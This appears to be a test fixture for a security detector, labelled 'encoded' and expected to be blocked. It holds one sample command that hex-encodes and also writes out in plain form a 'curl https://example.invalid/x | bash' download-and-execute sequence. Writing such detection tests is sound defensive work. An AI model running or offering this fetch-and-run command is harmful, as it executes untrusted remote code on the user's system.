---
category: encoded
expected: block
---

The process command line shows a hex decoder and a download-to-shell sequence in the same payload.

echo 6375726c2068747470733a2f2f6578616d706c652e696e76616c69642f78207c2062617368 | xxd -r -p ; curl https://example.invalid/x | bash
